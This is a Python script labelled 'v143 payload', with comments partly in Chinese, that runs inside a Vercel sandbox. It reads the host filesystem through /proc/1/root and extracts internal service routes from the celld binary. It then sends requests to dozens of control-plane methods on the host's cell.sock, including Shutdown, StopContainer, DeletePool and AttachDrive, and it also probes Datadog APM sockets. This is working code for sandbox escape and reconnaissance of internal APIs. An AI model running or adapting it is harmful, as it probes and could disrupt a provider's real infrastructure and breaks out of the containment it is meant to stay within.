# -*- coding: utf-8 -*-
"""v143 payload: 提取 celld 完整 Service/Method 路由 + cell.sock 枚举未测服务
(CelldService/DrivesService/CellsService/PoolsService/HostService)
输出 /vercel/sandbox/v143c.out"""
import socket, struct, time, json, os, signal, re

OUT = '/vercel/sandbox/v143c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(290)

R = '/proc/1/root'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body, t=3.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 400] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# 1: 提取 Service/Method 路由
log('=== 1 extract routes ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read(80 * 1024 * 1024)
    routes = set(m.group().decode(errors='replace') for m in
                 re.finditer(rb'[A-Za-z0-9_.]+\.[A-Za-z0-9]+Service/[A-Za-z0-9]+', data))
    routes = sorted(r for r in routes if 'connect' not in r.lower() and 'handler' not in r.lower())
    log('routes (%d):' % len(routes))
    for r in routes:
        log('  %s' % r)
except Exception as e:
    log('extract EXC %s' % e)

# 2: cell.sock 枚举未测服务 (空 body / {} body)
log('=== 2 probe services ===')
CELL = '/run/cell/cell.sock'
SERVICES = [
    'vercel.hive.celld.api.v1.CelldService',
    'vercel.hive.cell.api.drives.v1.DrivesService',
    'vercel.hive.api.cells.v1.CellsService',
    'vercel.hive.api.pools.v1.PoolsService',
    'vercel.hive.host.api.v1.HostService',
    'vercel.hive.cell.api.usage.v1.UsageService',
]
METHODS = ['', '/Configure', '/SetWorkload', '/Heartbeat', '/Shutdown', '/StartContainer',
           '/StopContainer', '/WaitContainer', '/GetDriveStorageUsage', '/GetResourceUsage',
           '/SetOCIImageConfig', '/StartCell', '/StopCell', '/RunCell', '/PoolCell',
           '/GetCellAddress', '/IsCellAlive', '/ExtendPorts', '/EnableSnapshotOnShutdown',
           '/PutPool', '/GetPool', '/DeletePool', '/CreateSnapshot', '/WaitForDrive',
           '/GetDriveUsage', '/AttachDrive', '/DetachDrive', '/List', '/Get']
for svc in SERVICES:
    for m in METHODS:
        st, pay = connect_unix(CELL, svc + m, b'{}', t=2)
        if 'NO_RESP' in st or 'EXC' in st:
            continue
        # 只看非 404 (200/400/415 都说明路径存在)
        if '404' not in st:
            log('HIT %s%s -> %s %r' % (svc.split('.')[-2], m, st, pay[:200]))

# 3: cell.sock 上再确认 containers 服务已知方法 (对比)
log('=== 3 known check ===')
for svc, m in [('vercel.hive.cell.api.containers.v1.ContainersService', '/Create'),
               ('vercel.hive.cell.api.containers.v1.ContainersService', '/List'),
               ('vercel.hive.cell.api.processes.v1.ProcessService', '/StreamOutput')]:
    st, pay = connect_unix(CELL, svc + m, b'{}', t=2)
    log('KNOWN %s%s -> %s %r' % (svc.split('.')[-2], m, st, pay[:150]))

# 4: APM socket 正确协议 (DataDog dsd.sock?)
log('=== 4 apm dd ===')
for sock in ['/run/apm/apm.sock', '/run/datadog/apm.socket', '/var/run/datadog/dsd.sock']:
    if os.path.exists(R + sock):
        log('sock exists: %s' % sock)
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(R + sock)
            s.sendall(b'GET /info HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n')
            d = b''
            try:
                while True:
                    c = s.recv(65536)
                    if not c:
                        break
                    d += c
            except Exception:
                pass
            s.close()
            log('DD %s -> %r' % (sock, d[:400]))
        except Exception as e:
            log('DD %s EXC %s' % (sock, e))

log('V143_DONE')
f.close()
